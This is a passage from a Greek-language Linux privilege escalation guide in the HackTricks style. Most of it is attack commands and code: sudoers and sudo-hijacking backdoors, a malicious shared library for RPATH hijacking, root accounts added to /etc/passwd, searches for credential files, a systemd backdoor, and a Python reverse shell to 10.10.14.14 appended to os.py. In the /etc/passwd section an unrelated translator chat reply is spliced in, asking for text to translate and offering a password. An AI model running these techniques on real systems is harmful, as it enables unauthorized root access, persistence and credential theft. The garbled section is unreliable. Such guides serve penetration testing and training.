echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος κατάχρησης αυτών των δικαιωμάτων:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές στο δυαδικό `sudo`, όπως το `doas` για OpenBSD — θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Αν γνωρίζετε ότι ένας **user συνήθως συνδέεται σε ένα μηχάνημα και χρησιμοποιεί `sudo`** για να αυξήσει τα προνόμια και έχετε ένα shell μέσα σε αυτό το user context, μπορείτε **να δημιουργήσετε ένα νέο εκτελέσιμο sudo** που θα εκτελέσει τον κώδικά σας ως root και στη συνέχεια την εντολή του user. Έπειτα, **τροποποιήστε το $PATH** του user context (για παράδειγμα προσθέτοντας το νέο path στο .bash_profile) ώστε όταν ο user εκτελεί sudo, να εκτελείται το εκτελέσιμο sudo σας.

Σημειώστε ότι αν ο user χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε το νέο path. Για παράδειγμα[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή εκτέλεση κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία ρυθμίσεων που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι θα διαβαστούν τα αρχεία ρυθμίσεων από `/etc/ld.so.conf.d/*.conf`. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου **βιβλιοθήκες** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Εάν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις αναφερόμενες διαδρομές: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται σε κάποιο αρχείο ρυθμίσεων μέσα στο `/etc/ld.so.conf.d/*.conf` ενδέχεται να μπορεί να αποκτήσει ανύψωση προνομίων.\
Δείτε **πώς να εκμεταλλευτείτε αυτή τη λανθασμένη διαμόρφωση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αν αντιγράψετε τη lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως καθορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **υποσύνολο των διαθέσιμων root privileges σε μια διεργασία**. Αυτό διασπά ουσιαστικά τα root **privileges σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο μειώνεται το πλήρες σύνολο δικαιωμάτων, μειώνοντας τον κίνδυνο εκμετάλλευσης.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για "execute"** υποδηλώνει ότι ο χρήστης μπορεί να κάνει "**cd**" μέσα στο φάκελο.\
Το **"read"** bit υποδηλώνει ότι ο χρήστης μπορεί να **προβάλει** τα **αρχεία**, και το **"write"** bit υποδηλώνει ότι ο χρήστης μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανό να **αντικαθιστά τα παραδοσιακά ugo/rwx permissions**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο πρόσβασης σε αρχείο ή κατάλογο, επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομερούς ελέγχου εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** τον χρήστη "kali" δικαιώματα "read" και "write" σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Εύρεση** αρχείων με συγκεκριμένα ACLs στο σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοιχτές shell sessions

Σε **παλιότερες εκδόσεις** μπορεί να **hijack** κάποια **shell** session διαφορετικού χρήστη (**root**).\
Στις **νεότερες εκδόσεις** θα μπορείτε να **connect** σε screen sessions μόνο του **δικού σας user**. Ωστόσο, μπορεί να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη session**.

### screen sessions hijacking

**Εμφάνιση screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Σύνδεση σε συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Κατάληψη συνεδριών tmux

Αυτό ήταν ένα πρόβλημα με τις **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να καταλάβω μια συνεδρία tmux (v2.1) που δημιουργήθηκε από τον root ως μη προνομιούχος χρήστης.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Σύνδεση σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, κλπ) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να επηρεάστηκαν από αυτό το bug.  
Αυτό το bug προκαλείται κατά τη δημιουργία νέου ssh key σε αυτά τα OS, αφού **μόνο 32,768 παραλλαγές ήταν δυνατές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείς να αναζητήσεις το αντίστοιχο private key**. Μπορείς να βρεις τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται η password authentication. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται η public key authentication. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν επιτρέπεται η password authentication, καθορίζει αν ο server επιτρέπει login σε λογαριασμούς με κενές password strings. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει αν ο root μπορεί να συνδεθεί μέσω ssh, η προεπιλογή είναι `no`. Πιθανές τιμές:

- `yes`: ο root μπορεί να συνδεθεί χρησιμοποιώντας password και private key
- `without-password` or `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με private key
- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με private key και αν έχουν οριστεί options των commands
- `no`: όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys που μπορούν να χρησιμοποιηθούν για user authentication. Μπορεί να περιέχει tokens όπως `%h`, που θα αντικατασταθεί από τον κατάλογο home. **Μπορείς να δηλώσεις absolute paths** (ξεκινούν από `/`) ή **relative paths από το home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η ρύθμιση θα υποδεικνύει ότι αν προσπαθήσεις να συνδεθείς με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key του κλειδιού σου με αυτά που βρίσκονται σε `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding σου επιτρέπει να **use your local SSH keys instead of leaving keys** (χωρίς passphrases!) να μένουν στον server σου. Έτσι, θα μπορείς να **jump** via ssh **to a host** και από εκεί **jump to another** host **using** the **key** located in your **initial host**.

Πρέπει να ορίσεις αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετική μηχανή, αυτή η μηχανή θα μπορεί να έχει πρόσβαση στα κλειδιά (που αποτελεί ζήτημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει** αυτές τις **επιλογές** και να επιτρέψει ή να απορρίψει αυτήν τη ρύθμιση.\  
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απορρίψει** το ssh-agent forwarding με το keyword `AllowAgentForwarding` (default is allow).

Εάν βρείτε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον διαβάστε την παρακάτω σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Σημαντικά Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν βρεθεί κάποιο περίεργο profile script, θα πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.

### Αρχεία Passwd/Shadow

Ανάλογα με το OS τα `/etc/passwd` και `/etc/shadow` αρχεία μπορεί να χρησιμοποιούν διαφορετικό όνομα ή να υπάρχει κάποιο backup. Συνεπώς συνιστάται να **τα βρείτε όλα** και **ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή το αντίστοιχο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιούργησε ένα password με μία από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Μπορείς να επικολλήσεις εδώ το περιεχόμενο του αρχείου src/linux-hardening/privilege-escalation/README.md που θέλεις να μεταφράσω στα Ελληνικά; Μόλις το λάβω θα επιστρέψω τη μετάφραση, διατηρώντας ακριβώς τη σύνταξη markdown/HTML και τις εξαιρούμενες λέξεις/ετικέτες όπως όρισες.

Παράλληλα, δημιούργησα έναν ισχυρό τυχαίο κωδικό για τον χρήστη hacker:

```
V9y$7rQp!mL2#kXw
```

Για να προσθέσεις τον χρήστη και να ορίσεις τον παραπάνω κωδικό, εκτέλεσε μία από τις παρακάτω εντολές στο σύστημα (εγώ δεν εκτελώ εντολές στον host):

Προτεινόμενη (useradd + chpasswd):
```
sudo useradd -m -s /bin/bash hacker
echo 'hacker:V9y$7rQp!mL2#kXw' | sudo chpasswd
sudo passwd -e hacker
```

Εναλλακτικά (useradd με κρυπτογραφημένο password):
```
sudo useradd -m -s /bin/bash -p "$(openssl passwd -6 'V9y$7rQp!mL2#kXw')" hacker
sudo passwd -e hacker
```

Θες να προχωρήσω με τη μετάφραση; Αν ναι, επικόλλησε το περιεχόμενο του README.md.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Τώρα μπορείτε να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν ψεύτικο χρήστη χωρίς password.\
ΠΡΟΣΟΧΗ: αυτό μπορεί να υποβαθμίσει την τρέχουσα ασφάλεια του μηχανήματος.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

Πρέπει να ελέγξεις αν μπορείς να **γράψεις σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείς να γράψεις σε κάποιο **αρχείο διαμόρφωσης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν το μηχάνημα τρέχει έναν **tomcat** server και μπορείτε να **τροποποιήσετε το Tomcat service configuration file μέσα στο /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει ο tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν backups ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορείτε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενη τοποθεσία/Owned αρχεία
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB αρχεία
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), αναζητά **πολλά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα ακόμη ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε γι' αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε έναν τοπικό υπολογιστή για Windows, Linux & Mac.

### Καταγραφές

Εάν μπορείτε να διαβάσετε logs, μπορεί να είστε σε θέση να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο περίεργο είναι ένα log, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, μερικά "**bad**" configured (backdoored?) **audit logs** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς πρόσβασης** μέσα στα audit logs όπως εξηγείται σε αυτό το άρθρο: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα logs, η ομάδα** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πραγματικά χρήσιμη.

### Αρχεία Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομα** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή hashes regexps.\
Δεν πρόκειται να απαριθμήσω εδώ πώς να κάνετε όλα αυτά, αλλά αν ενδιαφέρεστε μπορείτε να δείτε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν γνωρίζετε από πού θα εκτελεστεί ένα python script και μπορείτε να γράψετε μέσα σε αυτόν τον φάκελο ή να τροποποιήσετε python libraries, μπορείτε να τροποποιήσετε τη βιβλιοθήκη os και να την backdoor (αν μπορείτε να γράψετε στο σημείο όπου θα εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **backdoor the library** απλώς πρόσθεσε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (άλλαξε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση του logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **write permissions** σε ένα αρχείο καταγραφής ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως escalated privileges. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα permissions όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται η περιστροφή των logs.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει την έκδοση `logrotate` `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**, οπότε κάθε φορά που διαπιστώνετε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος τα διαχειρίζεται και αν μπορείτε να escalate privileges αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα script `ifcf-<whatever>` στο _/etc/sysconfig/network-scripts_ **ή** να **τροποποιήσει** ένα υπάρχον, τότε το σύστημά σας είναι **pwned**.

Τα network scripts, όπως το _ifcg-eth0_ για παράδειγμα, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, είναι \~sourced\~ στο Linux από τον Network Manager (dispatcher.d).

Στην περίπτωσή μου, η τιμή `NAME=` σε αυτά τα network scripts δεν χειρίζεται σωστά. Εάν υπάρχει **κενό/διάστημα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το μέρος μετά το κενό/διάστημα**. Αυτό σημαίνει ότι **ό,τιδήποτε μετά το πρώτο κενό εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημειώστε το κενό μεταξύ Network και /bin/id_)

### **init, init.d, systemd, and rc.d**

Ο κατάλογος `/etc/init.d` φιλοξενεί **scripts** για το System V init (SysVinit), το **παραδοσιακό σύστημα διαχείρισης υπηρεσιών Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart`, και μερικές φορές `reload` υπηρεσίες. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε συστήματα Redhat είναι `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` σχετίζεται με το Upstart, ένα νεότερο σύστημα διαχείρισης υπηρεσιών που εισήχθη από την Ubuntu, χρησιμοποιώντας αρχεία διαμόρφωσης για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση σε Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις Upstart ρυθμίσεις λόγω ενός compatibility layer στο Upstart.

Το systemd αποτελεί έναν σύγχρονο μηχανισμό αρχικοποίησης και διαχείρισης υπηρεσιών, προσφέροντας προηγμένες δυνατότητες όπως on-demand εκκίνηση daemon, διαχείριση automount και snapshots της κατάστασης του συστήματος. Οργανώνει αρχεία στο `/usr/lib/systemd/` για πακέτα διανομής και στο `/etc/systemd/system/` για τροποποιήσεις διαχειριστή, απλοποιώντας τη διαδικασία διαχείρισης συστήματος.

## Άλλες τεχνικές

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως κάνουν hook ένα syscall για να εκθέσουν privileged kernel functionality σε έναν userspace manager. Αδύναμη authentication του manager (π.χ. έλεγχοι signature βασισμένοι στο FD-order ή αδύναμα password schemes) μπορεί να επιτρέψει σε ένα τοπικό app να μιμηθεί τον manager και να αποκτήσει root σε συσκευές που είναι ήδη rooted. Μάθετε περισσότερα και λεπτομέρειες εκμετάλλευσης εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Η ανακάλυψη υπηρεσιών με βάση regex στο VMware Tools/Aria Operations μπορεί να εξάγει ένα path δυαδικού από τις command lines διεργασιών και να το εκτελέσει με -v υπό προνομιούχο context. Επιεικείς patterns (π.χ. χρήση του \S) μπορεί να ταιριάξουν με attacker-staged listeners σε εγγράψιμες τοποθεσίες (π.χ. /tmp/httpd), οδηγώντας σε εκτέλεση ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern που εφαρμόζεται και σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες Ασφαλείας Πυρήνα

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
